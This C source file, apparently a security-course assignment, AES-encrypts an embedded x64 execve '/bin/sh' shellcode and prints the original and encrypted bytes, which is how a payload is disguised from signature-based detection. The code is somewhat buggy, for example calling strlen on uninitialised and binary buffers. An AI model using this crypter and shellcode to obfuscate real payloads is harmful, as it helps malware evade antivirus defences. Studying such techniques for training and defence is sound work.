/*
Filename:      crypter.c
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  10.02.2019
Note:          x64 (Compile openssl from source)
               wget https://www.openssl.org/source/openssl-1.0.2q.tar.gz
               tar xvzf openssl-1.0.2q.tar.gz
               cd openssl-1.0.2q
               ./config shared --prefix=/opt/openssl
               make
               make install
               LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/opt/openssl/lib
               export LD_LIBRARY_PATH
Compiler:      gcc crypter.c -o crypter -I /opt/openssl/include -L /opt/openssl/lib -lcrypto
*/

#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<openssl/aes.h>

unsigned char shellcode [] = \
"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e"
"\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48"
"\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b"
"\x0f\x05";

void print_bytes(const char *tittle, const void* data, int len);

main()
{
  /* AES Encryption key, input from user */
  unsigned char input_key[256];
  unsigned char aes_key[16];

  while (strlen(input_key) != 16) {
    printf("Please enter an encryption key (16 characters): ");
    scanf("%s", &input_key);
  }
  strcpy(aes_key, input_key);

  /* Init vector
  # define AES_BLOCK_SIZE 16
  void *memset(void *str, int c, size_t n)
  */
	unsigned char iv[AES_BLOCK_SIZE];
	memset(iv, 0x00, AES_BLOCK_SIZE);

	/* Buffers for Encryption */
	unsigned char shellcode_enc[strlen(shellcode)];

  /* AES-128 bit CBC Encryption
  int AES_set_encrypt_key(const unsigned char *userKey, const int bits,
                          AES_KEY *key);
  void AES_cbc_encrypt(const unsigned char *in, unsigned char *out,
                       size_t length, const AES_KEY *key,
                       unsigned char *ivec, const int enc);
  */
  AES_KEY enc_key;
  AES_set_encrypt_key(aes_key, sizeof(aes_key)*8, &enc_key);
  AES_cbc_encrypt(shellcode, shellcode_enc, strlen(shellcode), &enc_key, iv, AES_ENCRYPT);

  /* Print information */
  printf("Shellcode Lenght: %d\n",strlen(shellcode));
  print_bytes("\nOriginal shellcode ",shellcode, strlen(shellcode));
  print_bytes("\nEncrypted shellcode",shellcode_enc, sizeof(shellcode_enc));

  return 0;
}

void print_bytes(const char *tittle, const void* data, int len)
{
	printf("%s : ",tittle);
	const unsigned char * p = (const unsigned char*)data;
	int i = 0;

	for (; i<len; ++i)
		printf("\\x%02X", *p++);

	printf("\n");
}
